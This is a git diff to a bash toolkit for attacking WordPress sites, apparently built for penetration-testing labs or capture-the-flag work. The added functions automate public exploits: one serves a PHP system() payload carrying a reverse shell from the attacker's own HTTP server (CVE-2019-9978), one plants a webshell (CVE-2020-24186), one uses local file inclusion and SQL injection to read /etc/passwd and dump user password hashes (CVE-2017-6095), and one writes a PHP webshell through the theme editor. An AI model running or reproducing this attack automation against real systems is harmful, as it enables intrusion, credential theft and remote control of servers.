@@ -12,6 +12,7 @@ run_wpscan() {
         wpscan_additional_options+=" --disable_tls_checks"
 
     fi
+    target_url=$(echo "$target_url" | sed 's/\/$//')
     if [[ -z $enumerate_wpscan ]]; then
         enumerate_wpscan="true"
     fi
@@ -50,8 +51,8 @@ run_wpscan() {
 
 enumerate_wp_users() {
     local target_host="$1"
-    if [[ -z "$target_host" ]]; then
-        echo "Usage: generate_wp_users <target_host>"
+    if [[ -z "$target_host" ]] && [[ -z $target_url ]]; then
+        echo "Usage: enumerate_wp_users <target_host>"
         return 1
     fi
     enumeration_option="u"
@@ -109,6 +110,7 @@ upload_plugin() {
         echo "Target hostname is not set. Using ip"
         target_url=http://$ip
     fi
+    target_url=$(echo "$target_url" | sed 's/\/$//')
     local plugin_page=""
     plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugins.php" | grep "$plugin_name" )
     if [[ -z "$plugin_page" ]]; then
@@ -241,4 +243,173 @@ perform_cve_2025_39538() {
     fi
     python3 CVE-2025-39538.py -u $target_url -un $username -p $password
     popd || return 1
+}
+
+perform_cve_2019_9978() {
+    local cve_dir="CVE-2019-9978"
+    local url="https://github.com/hash3liZer/CVE-2019-9978/archive/refs/heads/master.zip"
+    if [[ ! -d "$cve_dir" ]]; then
+        wget $url -O $cve_dir.zip
+        unzip -q $cve_dir.zip
+        mv CVE-2019-9978-master $cve_dir
+    fi
+    if [[ -z $target_url ]]; then
+        echo "Target URL is not set"
+        return 1
+    fi
+    if [[ -z $cmd ]]; then
+        cmd=$(get_bash_reverse_shell)
+    fi
+    payload_txt_file="payload.txt"
+    echo "<pre>system('$cmd')</pre>" > $payload_txt_file
+    pushd "$cve_dir" || return 1
+    payload_uri="http://$http_ip:$http_port/$payload_txt_file"
+    echo "target_url: $target_url"
+    echo "payload_uri: $payload_uri"
+    2to3 -w cve-2019-9978.py 
+    python3 cve-2019-9978.py --target $target_url --payload-uri $payload_uri
+    popd || return 1
+
+
+}
+
+perform_cve_2020_24186() {
+    local cve_dir="CVE-2020-24186"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir -p "$cve_dir"
+    fi
+    if [[ -z $target_url ]]; then
+        echo "Target URL is not set"
+        return 1
+    fi
+    if [[ -z $target_path ]]; then
+        echo "Target path is not set"
+        return 1
+    fi
+    pushd "$cve_dir" || return 1
+    if [[ ! -f 49967.py ]]; then
+        searchsploit -m 49967
+    fi
+    sed -E 's/^code_exec/#code_exec/' 49967.py > temp.py
+    webshell_url=$(python3 temp.py -u "$target_url" -p $target_path | grep Success | grep -oP '\Khttp://[^&]+')
+    echo "Webshell URL: $webshell_url"
+    popd || return 1
+
+}
+
+#for unauthenticated LFI exploitation or SQL injection
+#   example SQL injection
+#   exploit_type=sqli
+#   perform_cve_2017_6095 "0 union select $sql_nulls_front,user_login, user_pass, $sql_nulls_end from wordpress.wp_users; -- //"
+#   perform_cve_2017_6095 "0 union select $sql_nulls_front,user_pass, user_pass, $sql_nulls_end from wordpress.wp_users; -- //"
+#   example LFI exploitation
+#   exploit_type=lfi
+#   perform_cve_2017_6095 "/etc/passwd"
+
+perform_cve_2017_6095() {
+
+    local cve_dir="CVE-2017-6095"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir -p "$cve_dir"
+    fi
+    if [[ -z $target_url ]]; then
+        echo "Target URL is not set"
+        return 1
+    fi
+    if [[ -z $exploit_type ]]; then
+        exploit_type="sqli"
+    fi
+    if [[ ! -z $1 ]]; then
+        if [[ $exploit_type == "lfi" ]]; then
+            target_file="$1"
+        elif [[ $exploit_type == "sqli" ]]; then
+            sql_cmd="$1"
+        else
+            echo "Invalid exploit_type: $exploit_type"
+            return 1
+        fi
+    fi
+    if [[ $exploit_type == "sqli" ]]; then
+        if [[ -z $target_file ]]; then
+            target_file="/var/www/html/wordpress/wp-load.php"
+        elif [[ $target_file != *"wp-load.php"* ]]; then
+            target_file="/var/www/html/wordpress/wp-load.php"
+        fi
+        echo "Using SQL injection exploit with $target_file"
+    fi    
+    local list_id=""
+    if [[ ! -z $sql_cmd ]]; then
+        list_id=$(urlencode "$sql_cmd")
+    fi
+    pushd "$cve_dir" || return 1
+    echo "sql_cmd: $sql_cmd"
+    pl=$(urlencode "$target_file")
+    if [[ -z $username ]] && [[ -z $password ]]; then
+        echo "username or password is not set, using unauthenticated access"
+        curl -s "$target_url/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=$pl&list_id=$list_id" --proxy localhost:8080 
+    else
+        login_wp
+        curl -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$pl" --proxy localhost:8080 \
+            -d "camp_id=$list_id"
+    fi
+    popd || return 1
+
+}
+
+perform_wordpress_themeeditor_exploit() {
+    local exploit_dir="wp-theme-editor-exploit"
+    #local url="https://github.com/nisforrnicholas/WordPress-Theme-Editor-Exploit/archive/refs/heads/main.zip"
+    if [[ ! -d "$exploit_dir" ]]; then
+        mkdir -p "$exploit_dir"
+    fi
+    if [[ -z $target_url ]]; then
+        echo "Target URL is not set"
+        return 1
+    fi
+    if [[ -z $username ]]; then
+        echo "username is not set"
+        return 1
+    fi
+    if [[ -z $password ]]; then
+        echo "password is not set"
+        return 1
+    fi
+    if [[ -z $theme_name ]]; then
+        echo "theme_name is not set"
+        return 1
+    fi
+    if [[ -z $host_ip ]]; then
+        host_ip=$(get_host_ip)
+        echo "host_ip is not set, using $host_ip"
+    fi
+    if [[ -z $host_port ]]; then
+        host_port=4444
+        echo "host_port is not set, using $host_port"
+    fi
+    pushd "$exploit_dir" || return 1
+    login_wp
+    local response=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/theme-editor.php" \
+        -d "theme=$theme_name" \
+        -d "file=comments.php" \
+        -d "Submit=Select" )      
+    echo "$response" > response.html
+    hidden_inputs=$(extract_hidden_input "$response" "template")
+    hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
+    hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
+    if [[ -z "$hidden_inputs" ]]; then
+        echo "Failed to extract hidden inputs."
+        return 1
+    fi
+    echo "$response" | awk '/<textarea\>/ {flag=1; next} (flag) {print} /<\/textarea>/ {flag=0}' 
+    minimize_webshell=true
+    create_php_webshell
+    webshell=$(cat webshell.php)
+    response=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/theme-editor.php" \
+        -d "newcontent=$webshell" \
+        -d "$hidden_inputs" \
+        -d "newcontent=$(urlencode "$webshell")" \
+        -d "Submit=Update+File" )
+    curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-content/themes/$theme_name/comments.php" --proxy localhost:8080
+    popd || return 1
+
 }
